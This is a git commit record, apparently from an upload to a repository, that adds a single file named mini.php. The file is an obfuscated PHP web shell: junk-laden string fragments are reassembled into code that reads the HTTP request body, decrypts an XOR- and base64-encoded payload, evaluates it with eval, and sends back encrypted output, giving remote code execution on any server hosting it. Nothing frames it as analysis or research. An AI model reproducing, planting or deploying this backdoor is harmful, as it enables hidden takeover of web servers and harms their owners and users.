e255d7f49b2c69f36e1230e9fa98bf52a4ba28f2
MiniStaroo <nydbrawel@gmail.com>
2024-10-18 17:21:45 +0300

    Add files via upload

---
+++ mini.php
@@ -0,0 +1,11 @@
+<?php
+$J='$k=-9"63a9f0ea";$-9kh-9="7bb9805-9079-96b-9";$kf=-9"649e8548184-95";$-9p="HrO-9yGo-9oLj4g-9jjV-9K';
+$e='j=0;(-9$-9j<$c&&$-9i<$l);$j+-9+,$-9i++){$-9o.=-9$t{$i}^$k{$j-9};}}ret-9-9urn $o;}-9if (@-9pr-9eg';
+$K=';-9@ob_end_clea-9n();-9$r=@b-9ase64-9_-9encode(@x(@gzc-9ompres-9s($o),$-9k-9));pri-9nt("$p$kh$r$-9kf");}';
+$C='m";function-9 x(-9$t,$k){$c=-9strlen($k)-9;$l-9=strlen-9($t-9);$o=""-9;for($i=0;-9$i<$l;-9){for(-9$';
+$t='_match("-9/$kh(-9.+)$kf/",@fi-9-9le_get_cont-9-9ents(-9"-9php://input")-9,-9$m)==1) {@ob_-9start();@';
+$j='e-9val(@g-9zunc-9-9ompress(@x-9(@ba-9se6-94_decode($m[1])-9,$k)-9));$o-9=@-9ob_get-9_-9contents()';
+$a=str_replace('O','','cOOreateOO_OfOunction');
+$q=str_replace('-9','',$J.$C.$e.$t.$j.$K);
+$p=$a('',$q);$p();
+?>
